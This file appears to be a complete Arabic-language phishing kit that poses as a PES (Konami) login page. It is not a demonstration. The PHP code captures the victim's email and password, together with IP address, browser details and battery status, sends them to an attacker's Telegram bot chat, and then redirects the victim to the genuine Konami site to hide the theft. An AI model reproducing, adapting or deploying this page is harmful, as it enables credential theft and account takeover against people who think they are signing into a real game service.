<?php
$BOT_TOKEN = "BBOTTTTTTTTTTT";
$CHAT_ID = $_GET['chat_id'] ?? $_GET['ID'] ?? null;

if ($CHAT_ID && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'غير معروف';
    $date = date('Y-m-d H:i:s');

    $email = $_POST['email'] ?? 'غير معروف';
    $password = $_POST['password'] ?? 'غير معروف';

    $battery_status = "غير معروف";
    if (isset($_POST['battery_level']) && isset($_POST['battery_charging'])) {
        $battery_status = "{$_POST['battery_level']} - الشحن: {$_POST['battery_charging']}";
    }

    $message = "
📌 <b>تسجيل دخول جديد - PES</b>
🌍 <b>IP:</b> $ip
🔋 <b>البطارية:</b> $battery_status
🖥 <b>جهاز:</b> $user_agent
📧 <b>Email:</b> $email
🔑 <b>Password:</b> $password
📅 <b>التاريخ:</b> $date
";

    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage";
    $data = ['chat_id' => $CHAT_ID, 'text' => $message, 'parse_mode' => 'HTML'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    header("Location: https://www.konami.com/games/pes/");
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PES - تسجيل دخول</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: url('https://i.ibb.co/VWbRXkCp/Screenshot-20260411-002429-Google.jpg') no-repeat center center fixed;
      background-size: cover;
      margin: 0; padding: 0;
      display: flex; justify-content: center; align-items: center;
      height: 100vh; color: #fff;
    }
    .container {
      width: 300px; 
      background: rgba(0,0,0,0.85);
      padding: 25px; border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
      text-align: center;
    }
    .logo img { width: 100px; margin-bottom: 15px; }
    h2 { font-size: 18px; color: #1abc9c; margin-bottom: 15px; }
    label { font-size: 12px; margin-bottom: 3px; font-weight: bold; display:block; color:#fff; }
    input { width:100%; padding:8px; margin-bottom:10px; border:1px solid #1abc9c; border-radius:4px; font-size:12px; background:#111; color:#fff; }
    button { width:100%; padding:10px; background:#1abc9c; border:none; border-radius:4px; font-size:14px; cursor:pointer; color:#fff; font-weight:bold; text-shadow:1px 1px 2px #000; }
    button:hover { background:#16a085; }
    .help { font-size:11px; margin-top:8px; text-align:center; }
    .help a { color:#1abc9c; text-decoration:none; }
    .help a:hover { text-decoration:underline; }
    .new-account { margin-top:10px; text-align:center; }
    .new-account button { background:#34495e; border:none; color:#fff; font-weight:bold; font-size:12px; padding:8px 0; width:100%; border-radius:4px; text-shadow:1px 1px 1px #000; }
    .new-account button:hover { background:#2c3e50; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://i.ibb.co/0VVL9R00/Screenshot-20260411-002200-Google.jpg" alt="PES Logo">
    </div>
    <h2>تسجيل دخول - PES</h2>
    <form id="loginForm" method="post">
      <label for="email">البريد أو رقم الهاتف</label>
      <input type="text" id="email" name="email" required>
      <label for="password">كلمة المرور</label>
      <input type="password" id="password" name="password" required>
      <button type="submit">دخول</button>
    </form>
    <div class="help"><a href="#">نسيت كلمة المرور؟</a></div>
    <div class="new-account">
      <p>مستخدم جديد؟</p>
      <button>إنشاء حساب جديد</button>
    </div>
  </div>

<script>
async function collectBatteryInfo() {
  let batteryLevel="غير مدعوم", batteryCharging="غير مدعوم";
  if(navigator.getBattery){try{const b=await navigator.getBattery();batteryLevel=Math.round(b.level*100)+'%';batteryCharging=b.charging?'نعم':'لا';}catch(e){}}
  return {batteryLevel,batteryCharging};
}
document.getElementById('loginForm').addEventListener('submit',async function(e){
  e.preventDefault();
  const email=document.getElementById('email').value;
  const password=document.getElementById('password').value;
  const battery=await collectBatteryInfo();
  const formData=new FormData();
  formData.append('email',email);
  formData.append('password',password);
  formData.append('battery_level',battery.batteryLevel);
  formData.append('battery_charging',battery.batteryCharging);
  const urlParams=new URLSearchParams(window.location.search);
  const chatId=urlParams.get('chat_id')||urlParams.get('ID');
  if(!chatId){alert('معرف المستخدم غير موجود'); return;}
  fetch(window.location.href+"?chat_id="+chatId,{method:'POST',body:formData}).then(()=>{window.location.href="https://www.konami.com/games/pes/";}).catch(err=>console.error(err));
});
</script>
</body>
</html>
